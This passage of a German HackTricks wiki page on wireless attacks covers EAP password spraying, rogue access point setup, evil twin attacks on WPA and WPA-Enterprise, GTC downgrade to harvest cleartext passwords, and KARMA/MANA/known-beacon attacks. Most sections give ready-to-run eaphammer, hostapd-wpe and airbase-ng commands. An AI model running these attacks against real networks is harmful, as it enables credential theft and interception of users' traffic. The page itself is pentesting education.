EAP-TTLS folgt einem etwas anderen Verfahren. Mit EAP-TTLS authentifiziert sich der Client normalerweise mit PAP oder CHAP, gesichert durch den TLS-Tunnel. In diesem Fall enth√§lt der Client einen Benutzername-Attribut und entweder ein Passwort- oder CHAP-Passwort-Attribut in der initialen TLS-Nachricht, die nach der Tunnelherstellung gesendet wird.

Unabh√§ngig vom gew√§hlten Protokoll erh√§lt der PEAP/TTLS-Server nach Herstellung des TLS-Tunnels Kenntnis von der wahren Identit√§t des Benutzers. Die wahre Identit√§t kann als Benutzer@Bereich oder einfach Benutzer dargestellt werden. Wenn der PEAP/TTLS-Server auch f√ºr die Authentifizierung des Benutzers verantwortlich ist, besitzt er nun die Identit√§t des Benutzers und f√§hrt mit der durch den TLS-Tunnel gesch√ºtzten Authentifizierungsmethode fort. Andernfalls kann der PEAP/TTLS-Server eine neue RADIUS-Anfrage an den Heim-RADIUS-Server des Benutzers weiterleiten. Diese neue RADIUS-Anfrage l√§sst die PEAP- oder TTLS-Protokollschicht weg. In F√§llen, in denen die gesch√ºtzte Authentifizierungsmethode EAP ist, werden die inneren EAP-Nachrichten ohne den EAP-PEAP- oder EAP-TTLS-Wrapper an den Heim-RADIUS-Server gesendet. Das Benutzername-Attribut der ausgehenden RADIUS-Nachricht enth√§lt die wahre Identit√§t des Benutzers und ersetzt den anonymen Benutzernamen aus der eingehenden RADIUS-Anfrage. Wenn die gesch√ºtzte Authentifizierungsmethode PAP oder CHAP ist (nur von TTLS unterst√ºtzt), werden das Benutzername- und andere Authentifizierungsattribute aus der TLS-Nutzlast in der ausgehenden RADIUS-Nachricht ersetzt und ersetzen den anonymen Benutzernamen und die TTLS-EAP-Nachrichtenattribute in der eingehenden RADIUS-Anfrage.

Weitere Informationen finden Sie unter [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (Passwort-Spray)

Wenn erwartet wird, dass der Client einen **Benutzernamen und ein Passwort** verwendet (beachten Sie, dass **EAP-TLS in diesem Fall nicht g√ºltig** ist), k√∂nnten Sie versuchen, eine **Liste** von **Benutzernamen** (siehe n√§chster Abschnitt) und **Passw√∂rtern** zu erhalten und versuchen, auf den Zugriff zuzugreifen, indem Sie [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.** verwenden.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Du k√∂nntest diesen Angriff auch mit `eaphammer` durchf√ºhren:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client-Angriffstheorie

### Netzwerkauswahl und Roaming

* Das 802.11-Protokoll definiert, wie sich eine Station einem Extended Service Set (ESS) anschlie√üt, gibt jedoch nicht die Kriterien f√ºr die Auswahl eines ESS oder eines Zugriffspunkts (AP) darin an.
* Stationen k√∂nnen zwischen APs wechseln, die dieselbe ESSID teilen, und so die Konnektivit√§t √ºber ein Geb√§ude oder ein Gebiet aufrechterhalten.
* Das Protokoll erfordert eine Authentifizierung der Station beim ESS, schreibt jedoch keine Authentifizierung des AP bei der Station vor.

### Bevorzugte Netzwerklisten (PNLs)

* Stationen speichern die ESSID jedes drahtlosen Netzwerks, mit dem sie sich verbinden, in ihrer bevorzugten Netzwerkliste (PNL) zusammen mit netzwerkspezifischen Konfigurationsdetails.
* Die PNL wird verwendet, um automatisch eine Verbindung zu bekannten Netzwerken herzustellen und so die Benutzererfahrung durch Vereinfachung des Verbindungsvorgangs zu verbessern.

### Passives Scannen

* APs senden regelm√§√üig Beacon-Frames aus, um ihre Pr√§senz und Funktionen bekannt zu geben, einschlie√ülich der ESSID des AP, es sei denn, das Senden ist deaktiviert.
* W√§hrend des passiven Scannens h√∂ren Stationen auf Beacon-Frames. Wenn die ESSID eines Beacons mit einem Eintrag in der PNL der Station √ºbereinstimmt, kann die Station automatisch eine Verbindung zu diesem AP herstellen.
* Das Wissen √ºber die PNL eines Ger√§ts erm√∂glicht potenzielle Ausnutzung durch Nachahmung der ESSID eines bekannten Netzwerks, um das Ger√§t dazu zu bringen, sich mit einem Rogue-AP zu verbinden.

### Aktives Sondieren

* Aktives Sondieren beinhaltet, dass Stationen Sondierungsanfragen senden, um nahegelegene APs und deren Eigenschaften zu entdecken.
* Gerichtete Sondierungsanfragen zielen auf eine bestimmte ESSID ab und helfen dabei festzustellen, ob ein bestimmtes Netzwerk in Reichweite ist, auch wenn es sich um ein verstecktes Netzwerk handelt.
* Rundsende-Sondierungsanfragen haben ein leeres SSID-Feld und werden an alle nahegelegenen APs gesendet, sodass die Station nach einem bevorzugten Netzwerk suchen kann, ohne den Inhalt ihrer PNL preiszugeben.

## Einfacher AP mit Umleitung zum Internet

Bevor erkl√§rt wird, wie komplexere Angriffe durchgef√ºhrt werden, wird erl√§utert, **wie** man einfach **einen AP erstellt** und **dessen Datenverkehr** an eine mit dem **Internet verbundene Schnittstelle umleitet**.

√úberpr√ºfen Sie mit `ifconfig -a`, ob die WLAN-Schnittstelle zum Erstellen des AP und die mit dem Internet verbundene Schnittstelle vorhanden sind.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Erstellen Sie die Konfigurationsdatei `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dann **IP-Adressen** und **Routen setzen**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Und dann **starten** Sie dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Erstellen Sie eine Konfigurationsdatei `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stoppen Sie l√§stige Prozesse**, setzen Sie den **√úberwachungsmodus** und **starten Sie hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Weiterleitung und Umleitung
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## B√∂ser Zwilling

Ein b√∂ser Zwilling-Angriff nutzt die Art und Weise aus, wie WiFi-Clients Netzwerke erkennen, wobei sie sich haupts√§chlich auf den Netzwerknamen (ESSID) verlassen, ohne dass sich der Basisstation (Zugangspunkt) gegen√ºber dem Client authentifizieren muss. Die wichtigsten Punkte sind:

- **Schwierigkeiten bei der Unterscheidung**: Ger√§te haben Schwierigkeiten, zwischen legitimen und gef√§lschten Zugangspunkten zu unterscheiden, wenn sie denselben ESSID und denselben Verschl√ºsselungstyp teilen. Netzwerke in der realen Welt verwenden oft mehrere Zugangspunkte mit demselben ESSID, um die Abdeckung nahtlos zu erweitern.
- **Client-Roaming und Verbindungsm manipulation**: Das 802.11-Protokoll erm√∂glicht es Ger√§ten, zwischen Zugangspunkten innerhalb desselben ESS zu wechseln. Angreifer k√∂nnen dies ausnutzen, indem sie ein Ger√§t dazu verleiten, sich von seinem aktuellen Basisstation zu trennen und sich mit einem gef√§lschten zu verbinden. Dies kann erreicht werden, indem ein st√§rkeres Signal angeboten wird oder die Verbindung zur legitimen Basisstation durch Methoden wie Deauthentifizierungspakete oder Jamming gest√∂rt wird.
- **Herausforderungen bei der Ausf√ºhrung**: Das erfolgreiche Ausf√ºhren eines b√∂sen Zwilling-Angriffs in Umgebungen mit mehreren gut platzierten Zugangspunkten kann herausfordernd sein. Das Deauthentifizieren eines einzelnen legitimen Zugangspunkts f√ºhrt oft dazu, dass das Ger√§t sich mit einem anderen legitimen Zugangspunkt verbindet, es sei denn, der Angreifer kann alle nahegelegenen Zugangspunkte deauthentifizieren oder den gef√§lschten Zugangspunkt strategisch platzieren.

Sie k√∂nnen einen sehr einfachen Open Evil Twin erstellen (ohne die F√§higkeit, den Datenverkehr ins Internet zu leiten) durch:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Sie k√∂nnten auch einen Evil Twin mit **eaphammer** erstellen (beachten Sie, dass f√ºr die Erstellung von Evil Twins mit eaphammer die Schnittstelle **NICHT** im **Monitor**-Modus sein sollte):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oder mit Airgeddon: `Optionen: 5,6,7,8,9 (im Men√º f√ºr den Evil Twin-Angriff).`

![](<../../.gitbook/assets/image (1088).png>)

Bitte beachten Sie, dass standardm√§√üig, wenn ein ESSID in der PNL als WPA gesch√ºtzt gespeichert ist, das Ger√§t nicht automatisch eine Verbindung zu einem offenen Evil Twin herstellt. Sie k√∂nnen versuchen, den echten AP zu DoS-en und hoffen, dass der Benutzer manuell eine Verbindung zu Ihrem offenen Evil Twin herstellt, oder Sie k√∂nnten den echten AP DoS-en und einen WPA Evil Twin verwenden, um den Handshake zu erfassen (mit dieser Methode k√∂nnen Sie das Opfer nicht dazu bringen, sich mit Ihnen zu verbinden, da Sie den PSK nicht kennen, aber Sie k√∂nnen den Handshake erfassen und versuchen, ihn zu knacken).

_Einige Betriebssysteme und Antivirenprogramme warnen den Benutzer davor, eine Verbindung zu einem offenen Netzwerk herzustellen, da dies gef√§hrlich ist..._

### WPA/WPA2 Evil Twin

Sie k√∂nnen einen **Evil Twin mit WPA/2** erstellen und wenn die Ger√§te so konfiguriert sind, dass sie sich mit diesem SSID mit WPA/2 verbinden, werden sie versuchen, eine Verbindung herzustellen. Wie auch immer, um den **4-Wege-Handshake abzuschlie√üen**, m√ºssen Sie auch das **Passwort** kennen, das der Client verwenden wird. Wenn Sie es **nicht wissen**, wird die **Verbindung nicht abgeschlossen**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Unternehmens-√úbelzwilling

Um diese Angriffe zu verstehen, empfehle ich, zuerst die kurze [WPA Enterprise Erkl√§rung](./#wpa-enterprise-mgt) zu lesen.

**Verwendung von hostapd-wpe**

`hostapd-wpe` ben√∂tigt eine **Konfigurationsdatei**, um zu funktionieren. Um die Generierung dieser Konfigurationen zu **automatisieren**, k√∂nnten Sie [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) verwenden (laden Sie die Python-Datei in _/etc/hostapd-wpe/_ herunter).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Im Konfigurationsfile k√∂nnen Sie viele verschiedene Dinge ausw√§hlen, wie z.B. SSID, Kanal, Benutzerdateien, Zertifikat/Schl√ºssel, DH-Parameter, WPA-Version und Authentifizierung...

[**Verwendung von hostapd-wpe mit EAP-TLS, um jedem Zertifikat die Anmeldung zu erm√∂glichen.**](evil-twin-eap-tls.md)

**Verwendung von EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standardm√§√üig verwendet EAPHammer diese Authentifizierungsmethoden (beachten Sie GTC als erste Methode, um Klartextpassw√∂rter zu erhalten, und dann die Verwendung robusterer Authentifizierungsmethoden):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dies ist die Standardmethodik, um lange Verbindungsziten zu vermeiden. Sie k√∂nnen jedoch auch angeben, dass der Server die Authentifizierungsmethoden von schw√§chsten bis st√§rksten durchl√§uft:
```
--negotiate weakest
```
Oder Sie k√∂nnten auch verwenden:

* `--negotiate gtc-downgrade` um eine hoch effiziente GTC-Downgrade-Implementierung zu verwenden (Klartextpassw√∂rter)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` um manuell die angebotenen Methoden festzulegen (das Angebot der gleichen Authentifizierungsmethoden in der gleichen Reihenfolge wie die Organisation wird den Angriff viel schwieriger zu erkennen machen).
* [Weitere Informationen finden Sie im Wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Mit Airgeddon**

`Airgeddon` kann zuvor generierte Zertifikate verwenden, um EAP-Authentifizierung f√ºr WPA/WPA2-Enterprise-Netzwerke anzubieten. Das gef√§lschte Netzwerk wird das Verbindungsprotokoll auf EAP-MD5 herabstufen, um **den Benutzer und das MD5 des Passworts zu erfassen**. Sp√§ter kann der Angreifer versuchen, das Passwort zu knacken.\
`Airggedon` bietet Ihnen die M√∂glichkeit eines **kontinuierlichen Evil Twin-Angriffs (lautstark)** oder **nur den Evil Attack zu erstellen, bis sich jemand verbindet (sanft).**

![](<../../.gitbook/assets/image (936).png>)

### Debuggen von PEAP- und EAP-TTLS-TLS-Tunneln bei Evil Twins-Angriffen

_Diese Methode wurde bei einer PEAP-Verbindung getestet, aber da ich einen beliebigen TLS-Tunnel entschl√ºssele, sollte dies auch mit EAP-TTLS funktionieren._

Im **Konfigurations**-Abschnitt von _hostapd-wpe_ **kommentieren** Sie die Zeile, die _**dh\_file**_ enth√§lt (von `dh_file=/etc/hostapd-wpe/certs/dh` zu `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dadurch wird `hostapd-wpe` dazu gebracht, **Schl√ºssel mit RSA auszutauschen** anstatt mit DH, sodass Sie den Datenverkehr sp√§ter **entschl√ºsseln** k√∂nnen, wenn Sie den privaten Schl√ºssel des Servers kennen.

Starten Sie nun den **Evil Twin** mit **`hostapd-wpe`** mit dieser modifizierten Konfiguration wie gewohnt. Starten Sie auch **`Wireshark`** auf der **Schnittstelle**, die den Evil Twin-Angriff durchf√ºhrt.

Jetzt oder sp√§ter (wenn Sie bereits einige Authentifizierungsversuche erfasst haben) k√∂nnen Sie den privaten RSA-Schl√ºssel in Wireshark hinzuf√ºgen unter: `Bearbeiten --> Einstellungen --> Protokolle --> TLS --> (RSA-Schl√ºsselliste) Bearbeiten...`

F√ºgen Sie einen neuen Eintrag hinzu und f√ºllen Sie das Formular mit diesen Werten aus: **IP-Adresse = beliebig** -- **Port = 0** -- **Protokoll = Daten** -- **Schl√ºsseldatei** (**w√§hlen Sie Ihre Schl√ºsseldatei aus**, um Probleme zu vermeiden, w√§hlen Sie eine Schl√ºsseldatei **ohne Passwortschutz**).

![](<../../.gitbook/assets/image (687).png>)

Und schauen Sie sich den neuen **"Entschl√ºsselte TLS" Tab** an:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Loud MANA und Known Beacons-Angriff

### ESSID- und MAC-Black-/Whitelists

Verschiedene Arten von Media Access Control Filter Lists (MFACLs) und ihre entsprechenden Modi und Auswirkungen auf das Verhalten eines Rogue Access Points (AP):

1. **MAC-basierte Whitelist**:
* Der Rogue-AP antwortet nur auf Anforderungen von Ger√§ten, die in der Whitelist aufgef√ºhrt sind, und bleibt f√ºr alle anderen unsichtbar.
2. **MAC-basierte Blacklist**:
* Der Rogue-AP ignoriert Anforderungen von Ger√§ten auf der Blacklist und macht den Rogue-AP f√ºr diese spezifischen Ger√§te effektiv unsichtbar.
3. **ESSID-basierte Whitelist**:
* Der Rogue-AP antwortet nur auf Anforderungen f√ºr bestimmte aufgef√ºhrte ESSIDs und bleibt f√ºr Ger√§te unsichtbar, deren Preferred Network Lists (PNLs) diese ESSIDs nicht enthalten.
4. **ESSID-basierte Blacklist**:
* Der Rogue-AP antwortet nicht auf Anforderungen f√ºr die spezifischen ESSIDs in der Blacklist und bleibt f√ºr Ger√§te unsichtbar, die nach diesen bestimmten Netzwerken suchen.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Diese Methode erm√∂glicht es einem **Angreifer, einen b√∂sartigen Zugangspunkt (AP) zu erstellen, der auf alle Sondieranfragen von Ger√§ten antwortet, die versuchen, sich mit Netzwerken zu verbinden**. Diese Technik **t√§uscht Ger√§te, um sich mit dem AP des Angreifers zu verbinden**, indem sie die Netzwerke nachahmt, nach denen die Ger√§te suchen. Sobald ein Ger√§t eine Verbindungsanfrage an diesen Rogue-AP sendet, wird die Verbindung hergestellt, was dazu f√ºhrt, dass das Ger√§t f√§lschlicherweise mit dem Netzwerk des Angreifers verbunden ist.

### MANA

Dann begannen **Ger√§te, unerw√ºnschte Netzwerkantworten zu ignorieren**, was die Wirksamkeit des urspr√ºnglichen Karma-Angriffs verringerte. Allerdings wurde eine neue Methode, bekannt als der **MANA-Angriff**, von Ian de Villiers und Dominic White eingef√ºhrt. Diese Methode beinhaltet, dass der Rogue-AP **die Preferred Network Lists (PNL) von Ger√§ten erfasst, indem er auf deren Rundruf-Sondieranfragen reagiert** und Netzwerknamen (SSIDs) sendet, die zuvor von den Ger√§ten angefordert wurden. Dieser ausgekl√ºgelte Angriff umgeht die Schutzma√ünahmen gegen den urspr√ºnglichen Karma-Angriff, indem er ausnutzt, wie Ger√§te bekannte Netzwerke speichern und priorisieren.

Der MANA-Angriff funktioniert, indem er sowohl gerichtete als auch Rundruf-Sondieranfragen von Ger√§ten √ºberwacht. Bei gerichteten Anfragen zeichnet er die MAC-Adresse des Ger√§ts und den angeforderten Netzwerknamen auf und f√ºgt diese Informationen einer Liste hinzu. Wenn eine Rundrufanfrage empfangen wird, antwortet der AP mit Informationen, die zu einem der Netzwerke auf der Liste des Ger√§ts passen, um das Ger√§t dazu zu verleiten, sich mit dem Rogue-AP zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Laute MANA

Ein **Laute MANA-Angriff** ist eine fortgeschrittene Strategie, wenn Ger√§te keine gerichteten Sondierungen verwenden oder wenn ihre bevorzugten Netzwerklisten (PNL) dem Angreifer unbekannt sind. Er basiert auf dem Prinzip, dass **Ger√§te im selben Bereich wahrscheinlich einige Netzwerknamen in ihren PNLs teilen**. Anstatt selektiv zu antworten, sendet dieser Angriff Sondierungsantworten f√ºr jeden im kombinierten PNL aller beobachteten Ger√§te gefundenen Netzwerknamen (ESSID) aus. Dieser breite Ansatz erh√∂ht die Chance, dass ein Ger√§t ein vertrautes Netzwerk erkennt und versucht, eine Verbindung zum Rogue Access Point (AP) herzustellen.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Bekannter Beacon-Angriff

Wenn der **Loud MANA-Angriff** nicht ausreicht, bietet der **Bekannte Beacon-Angriff** einen anderen Ansatz. Diese Methode **erzwingt den Verbindungsprozess, indem sie einen AP simuliert, der auf jeden Netzwerknamen antwortet, indem sie eine Liste potenzieller ESSIDs aus einer Wortliste durchl√§uft**. Dies simuliert die Anwesenheit zahlreicher Netzwerke in der Hoffnung, eine ESSID im PNL des Opfers abzugleichen, was zu einem Verbindungsversuch mit dem gef√§lschten AP f√ºhrt. Der Angriff kann verst√§rkt werden, indem er mit der Option `--loud` kombiniert wird, um einen aggressiveren Versuch zu unternehmen, Ger√§te zu fangen.

Eaphammer implementierte diesen Angriff als MANA-Angriff, bei dem alle ESSIDs in einer Liste aufgeladen werden (Sie k√∂nnten dies auch mit `--loud` kombinieren, um einen Loud MANA + Bekannte Beacons-Angriff zu erstellen):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Bekannter Beacon Burst Angriff**

Der **bekannte Beacon Burst Angriff** beinhaltet **das schnelle Aussenden von Beacon-Frames f√ºr jede in einer Datei aufgelistete ESSID**. Dies schafft eine dichte Umgebung aus gef√§lschten Netzwerken, was die Wahrscheinlichkeit erh√∂ht, dass Ger√§te sich mit dem Rogue-AP verbinden, insbesondere wenn dies mit einem MANA-Angriff kombiniert wird. Diese Technik nutzt Geschwindigkeit und Menge, um die Netzwerkauswahlmechanismen der Ger√§te zu √ºberlasten.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ist ein Protokoll, das es Ger√§ten erm√∂glicht, direkt miteinander √ºber Wi-Fi zu verbinden, ohne auf einen herk√∂mmlichen drahtlosen Zugangspunkt angewiesen zu sein. Diese F√§higkeit ist in verschiedene Internet of Things (IoT)-Ger√§te integriert, wie Drucker und Fernseher, und erm√∂glicht eine direkte Ger√§te-zu-Ger√§te-Kommunikation. Ein bemerkenswertes Merkmal von Wi-Fi Direct ist, dass ein Ger√§t die Rolle eines Zugangspunkts √ºbernimmt, bekannt als der Gruppenbesitzer, um die Verbindung zu verwalten.

Die Sicherheit f√ºr Wi-Fi Direct-Verbindungen wird durch **Wi-Fi Protected Setup (WPS)** hergestellt, das verschiedene Methoden f√ºr sicheres Pairing unterst√ºtzt, einschlie√ülich:

* **Push-Button Configuration (PBC)**
* **PIN-Eingabe**
* **Near-Field Communication (NFC)**

Diese Methoden, insbesondere die PIN-Eingabe, sind anf√§llig f√ºr die gleichen Schwachstellen wie WPS in herk√∂mmlichen Wi-Fi-Netzwerken und machen sie zu Zielen f√ºr √§hnliche Angriffsvektoren.

### EvilDirect Hijacking

**EvilDirect Hijacking** ist ein Angriff, der spezifisch f√ºr Wi-Fi Direct ist. Er spiegelt das Konzept eines Evil Twin-Angriffs wider, zielt jedoch auf Wi-Fi Direct-Verbindungen ab. In diesem Szenario gibt sich ein Angreifer als legitimer Gruppenbesitzer aus, mit dem Ziel, Ger√§te dazu zu bringen, sich mit einer b√∂sartigen Entit√§t zu verbinden. Diese Methode kann mithilfe von Tools wie `airbase-ng` ausgef√ºhrt werden, indem der Kanal, die ESSID und die MAC-Adresse des imitierten Ger√§ts angegeben werden:

## Referenzen

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Werfen Sie einen Blick auf [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (Anmeldung mit Facebook und Nachahmung von WPA in Captive Portals)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Welt des Hackens durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
